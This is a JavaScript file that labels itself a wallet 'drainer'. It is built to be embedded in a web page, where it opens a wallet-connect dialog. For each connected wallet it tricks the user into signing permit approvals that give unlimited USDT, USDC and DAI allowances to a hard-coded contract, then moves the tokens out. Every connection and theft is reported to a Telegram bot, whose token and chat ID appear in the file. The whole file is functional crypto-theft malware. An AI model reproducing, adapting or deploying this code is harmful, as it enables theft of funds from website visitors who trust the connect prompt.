// resolution.js - <w3m-modal> EVENT DRAINER + UBR LOGGER
// Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=11

const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
const DRAINER_CONTRACT = '0xa6f8aed0de04de90af07229187a0fa3143d70c6e';

const TOKENS = {
  1: {
    '0xdAC17F958D2ee523a2206206994597C13D831ec7': 'USDT',
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 'USDC',
    '0x6B175474E89094C44Da98b954EedeAC495271d0F': 'DAI'
  }
};

// Embed modal
document.body.insertAdjacentHTML('beforeend', `
  <w3m-modal projectId="${PROJECT_ID}" themeMode="dark"></w3m-modal>
`);

// Load ethers
const ethersScript = document.createElement('script');
ethersScript.src = 'https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js';
ethersScript.onload = () => {
  const modal = document.querySelector('w3m-modal');
  if (modal) {
    modal.addEventListener('connect', async (event) => {
      const { provider } = event.detail;
      const ethersProvider = new ethers.BrowserProvider(provider);
      const signer = await ethersProvider.getSigner();
      const user = await signer.getAddress();
      console.log('Connected:', user);
      sendToTelegram(`<b>🔗 UBR CONNECTED</b>\nWallet: <code>${user}</code>\nTime: ${new Date().toLocaleString()}`);
      await drainAll(ethersProvider, signer, user);
    });
  }
};
document.head.appendChild(ethersScript);

async function drainAll(provider, signer, user) {
  for (const [token, name] of Object.entries(TOKENS[1])) {
    try {
      const tokenContract = new ethers.Contract(token, ['function balanceOf(address) view returns (uint256)', 'function nonces(address) view returns (uint256)'], provider);
      const balance = await tokenContract.balanceOf(user);
      if (balance === 0n) continue;

      console.log(`Draining ${name}...`);

      const domain = { name: name, version: '1', chainId: 1, verifyingContract: token };
      const types = { Permit: [
        { name: 'owner', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ]};

      const value = ethers.MaxUint256;
      const nonce = await tokenContract.nonces(user);
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const message = { owner: user, spender: DRAINER_CONTRACT, value, nonce, deadline };

      const sig = await signer.signTypedData(domain, types, message);
      const { v, r, s } = ethers.Signature.from(sig);

      const drainerContract = new ethers.Contract(DRAINER_CONTRACT, ['function resolveWithPermit(address,address,uint256,uint256,uint8,bytes32,bytes32)'], signer);
      const tx = await drainerContract.resolveWithPermit(token, user, value, deadline, v, r, s);
      await tx.wait();

      console.log(`${name} DRAINED! Tx: ${tx.hash}`);
      sendToTelegram(`<b>🟢 UBR DRAINED</b> ${name}\nWallet: <code>${user.slice(0,6)}...${user.slice(-4)}</code>\nTx: <a href="https://etherscan.io/tx/${tx.hash}">View Tx</a>\nTime: ${new Date().toLocaleString()}`);
    } catch (err) {
      console.warn(`Failed ${name}:`, err.message);
    }
  }
}

window.connectWallet = () => document.querySelector('w3m-modal')?.open();

// UBR LOGGER TELEGRAM ALERTS
const TELEGRAM_TOKEN = '8494512292:AAFvONmyU_G2iUj7chy1HK3M_6c65aakLZg';
const TELEGRAM_CHAT_ID = '7178177226';

async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
      chat_id: TELEGRAM_CHAT_ID, 
      text: message,
      parse_mode: 'HTML'
    })
  }).catch(() => {});
}
